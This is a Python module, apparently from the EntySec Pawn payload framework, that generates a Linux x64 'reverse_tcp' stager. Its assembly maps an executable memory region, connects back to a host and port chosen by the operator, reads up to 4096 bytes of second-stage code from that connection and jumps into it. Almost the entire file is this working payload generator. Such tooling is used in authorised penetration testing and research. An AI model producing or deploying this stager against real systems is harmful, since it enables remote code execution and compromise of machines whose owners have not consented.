"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from textwrap import dedent

from pex.assembler import Assembler

from pawn.lib.module import *


class PawnModule(Module, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "linux/x64/reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Arch': "x64",
            'Platform': "linux",
            'Type': "reverse_tcp",
        })

        self.host = IPv4Option(None, 'Host to connect to.', True)
        self.port = PortOption(None, 'Port to connect to.', True)
        self.length = IntegerOption(4096, 'Length of the implant.', True)
        self.reliable = BooleanOption('yes', 'Make payload reliable.', True)

    def run(self):
        payload = dedent(f"""\
            start:
                push 0x9
                pop  rax
                xor  rdi, rdi
                push {hex(self.length.value)}
                pop  rsi
                push 0x7
                pop  rdx
                xor  r9, r9
                push 0x22
                pop  r10
                syscall

        """)

        if self.reliable.value:
            payload += dedent("""\
                    test rax, rax
                    js   fail
            """)

        payload += dedent(f"""\
                push rax

                push 0x29
                pop  rax
                cdq
                push 0x2
                pop  rdi
                push 0x1
                pop  rsi
                syscall

                xchg   rdi, rax
                movabs rcx, 0x{self.host.little.hex()}{self.port.little.hex()}0002
                push   rcx
                mov    rsi, rsp
                push   0x10
                pop    rdx
                push   0x2a
                pop    rax
                syscall

                pop rcx

                push 0x2d
                pop  rax
                pop  rsi
                push {hex(self.length.value)}
                pop  rdx
                push 0x100
                pop  r10
                syscall
        """)

        if self.reliable.value:
            payload += dedent("""\
                    test rax, rax
                    js   fail
            """)

        payload += dedent("""\
                jmp rsi
        """)

        if self.reliable.value:
            payload += dedent("""\
                fail:
                    push 0x3c
                    pop  rax
                    xor  rdi, rdi
                    syscall
            """)

        return self.assemble(
            self.details['Arch'], payload)
